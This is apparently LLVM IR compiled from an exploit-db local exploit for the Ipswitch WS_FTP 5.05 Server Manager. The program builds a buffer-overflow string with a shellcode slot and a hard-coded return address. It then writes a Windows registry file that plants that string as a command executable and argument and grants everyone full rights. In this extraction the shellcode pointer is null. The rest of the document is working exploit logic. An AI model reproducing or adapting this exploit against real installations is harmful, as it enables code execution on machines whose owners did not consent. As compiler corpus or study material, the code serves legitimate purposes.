; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_3649.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_3649.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [68 x i8] c"[+] Ipswitch WS_FTP 5.05 Server Manager Local Site Buffer Overflow\0A\00", align 1
@.str.1 = private unnamed_addr constant [64 x i8] c"[+] Coded and discovered by Marsu <Marsupilamipowa@hotmail.fr>\0A\00", align 1
@.str.2 = private unnamed_addr constant [34 x i8] c"[+] Usage: %s <Group> <file.reg>\0A\00", align 1
@.str.3 = private unnamed_addr constant [32 x i8] c"[+] ex:    %s Marsu Pilami.reg\0A\00", align 1
@CalcShellcode = common dso_local global i8* null, align 8
@.str.4 = private unnamed_addr constant [5 x i8] c"F\E4\BD|\00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"wb\00", align 1
@.str.6 = private unnamed_addr constant [41 x i8] c"Windows Registry Editor Version 5.00\0D\0A\0D\0A\00", align 1
@.str.7 = private unnamed_addr constant [71 x i8] c"[HKEY_LOCAL_MACHINE\\SOFTWARE\\Ipswitch\\iFtpSvc\\Domains\\%s\\Commands]\0D\0A\0D\0A\00", align 1
@.str.8 = private unnamed_addr constant [92 x i8] c"[HKEY_LOCAL_MACHINE\\SOFTWARE\\Ipswitch\\iFtpSvc\\Domains\\%s\\Commands\\aa]\0D\0A\22_Executable\22=\22%s\22\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [20 x i8] c"\22_Arguments\22=\22%s\22\0D\0A\00", align 1
@.str.10 = private unnamed_addr constant [31 x i8] c"\22*everyone\22=dword:000000ff\0D\0A\0D\0A\00", align 1
@.str.11 = private unnamed_addr constant [21 x i8] c"[+] Done. Have fun!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32*, align 8
  %7 = alloca [250 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %8 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str, i64 0, i64 0))
  %9 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.1, i64 0, i64 0))
  %10 = load i32, i32* %4, align 4
  %11 = icmp ne i32 %10, 3
  br i1 %11, label %12, label %21

12:                                               ; preds = %2
  %13 = load i8**, i8*** %5, align 8
  %14 = getelementptr inbounds i8*, i8** %13, i64 0
  %15 = load i8*, i8** %14, align 8
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.2, i64 0, i64 0), i8* %15)
  %17 = load i8**, i8*** %5, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.3, i64 0, i64 0), i8* %19)
  store i32 0, i32* %3, align 4
  br label %61

21:                                               ; preds = %2
  %22 = getelementptr inbounds [250 x i8], [250 x i8]* %7, i64 0, i64 0
  %23 = call i32 @memset(i8* %22, i8 signext 67, i32 250)
  %24 = getelementptr inbounds [250 x i8], [250 x i8]* %7, i64 0, i64 0
  %25 = getelementptr inbounds i8, i8* %24, i64 4
  %26 = load i8*, i8** @CalcShellcode, align 8
  %27 = load i8*, i8** @CalcShellcode, align 8
  %28 = call i32 @strlen(i8* %27)
  %29 = call i32 @memcpy(i8* %25, i8* %26, i32 %28)
  %30 = getelementptr inbounds [250 x i8], [250 x i8]* %7, i64 0, i64 0
  %31 = getelementptr inbounds i8, i8* %30, i64 202
  %32 = call i32 @memcpy(i8* %31, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0), i32 4)
  %33 = getelementptr inbounds [250 x i8], [250 x i8]* %7, i64 0, i64 0
  %34 = getelementptr inbounds i8, i8* %33, i64 215
  %35 = call i32 @memset(i8* %34, i8 signext 0, i32 1)
  %36 = load i8**, i8*** %5, align 8
  %37 = getelementptr inbounds i8*, i8** %36, i64 2
  %38 = load i8*, i8** %37, align 8
  %39 = call i32* @fopen(i8* %38, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  store i32* %39, i32** %6, align 8
  %40 = load i32*, i32** %6, align 8
  %41 = call i32 (i32*, i8*, ...) @fprintf(i32* %40, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.6, i64 0, i64 0))
  %42 = load i32*, i32** %6, align 8
  %43 = load i8**, i8*** %5, align 8
  %44 = getelementptr inbounds i8*, i8** %43, i64 1
  %45 = load i8*, i8** %44, align 8
  %46 = call i32 (i32*, i8*, ...) @fprintf(i32* %42, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.7, i64 0, i64 0), i8* %45)
  %47 = load i32*, i32** %6, align 8
  %48 = load i8**, i8*** %5, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 1
  %50 = load i8*, i8** %49, align 8
  %51 = getelementptr inbounds [250 x i8], [250 x i8]* %7, i64 0, i64 0
  %52 = call i32 (i32*, i8*, ...) @fprintf(i32* %47, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.8, i64 0, i64 0), i8* %50, i8* %51)
  %53 = load i32*, i32** %6, align 8
  %54 = getelementptr inbounds [250 x i8], [250 x i8]* %7, i64 0, i64 0
  %55 = call i32 (i32*, i8*, ...) @fprintf(i32* %53, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.9, i64 0, i64 0), i8* %54)
  %56 = load i32*, i32** %6, align 8
  %57 = call i32 (i32*, i8*, ...) @fprintf(i32* %56, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.10, i64 0, i64 0))
  %58 = load i32*, i32** %6, align 8
  %59 = call i32 @fclose(i32* %58)
  %60 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.11, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %61

61:                                               ; preds = %21, %12
  %62 = load i32, i32* %3, align 4
  ret i32 %62
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @fprintf(i32*, i8*, ...) #1

declare dso_local i32 @fclose(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
